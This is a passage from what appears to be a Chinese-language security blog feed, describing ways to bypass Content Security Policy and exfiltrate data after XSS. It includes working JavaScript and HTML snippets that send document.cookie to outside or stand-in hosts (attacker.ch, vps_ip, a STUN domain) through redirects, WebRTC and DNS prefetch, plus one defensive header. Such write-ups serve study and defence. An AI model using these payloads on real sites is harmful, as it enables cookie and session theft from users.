class="string">&#x27;https://127.0.0.1/?q=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span> <span class="comment">//这种是在当前页面跳转</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://127.0.0.1/?q=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>) <span class="comment">// 这种需要被攻击者确认弹窗，在UI模式下，headless不清楚</span></span><br></pre></td></tr></table></figure></li><li><p>WebRTC<br>通过dns来获取数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="title class_">RTCPeerConnection</span>(&#123;</span><br><span class="line">    <span class="attr">iceServers</span>: [&#123;</span><br><span class="line">        <span class="attr">urls</span>: <span class="string">&quot;stun:&quot;</span> + <span class="string">&quot;7a04c2947c.ipv6.1433.eu.org:1337&quot;</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;);</span><br><span class="line">p.<span class="title function_">createDataChannel</span>(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">p.<span class="title function_">setLocalDescription</span>()</span><br></pre></td></tr></table></figure></li><li><p>DNS prefetch<br>为了让加载速度更快，浏览器可以提前去解析一些标签的host为ip，但是只限于老版本的浏览器，现在新的已经不行了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sessionid = <span class="variable language_">document</span>.<span class="property">cookie</span>.<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>]+<span class="string">&quot;.&quot;</span>; </span><br><span class="line"><span class="keyword">var</span> body = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;body&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">body.<span class="property">innerHTML</span> = body.<span class="property">innerHTML</span> + <span class="string">&quot;&lt;link rel=\&quot;dns-prefetch\&quot; href=\&quot;//&quot;</span> + sessionid + <span class="string">&quot;attacker.ch\&quot;&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- firefox --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;dns-prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;//$&#123;cookie&#125;.vps_ip&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- chrome --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;prefetch&quot;</span> <span class="attr">href</span>=<span class="string">&quot;//vps_ip?$&#123;cookie&#125;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以加上这个header用来防御<br><code>X-DNS-Prefetch-Control: off</code></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;绕过csp的一些方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10316449&quot;&gt;https://ithelp.ithome.com.tw/articles/10316449&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</summary>
    
    
    
    <category term="前端安全" scheme="https://kaikaix.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="https://kaikaix.github.io/tags/javascript/"/>
    
    <category term="xss" scheme="https://kaikaix.github.io/tags/xss/"/>
    
  </entry>
  
</feed>
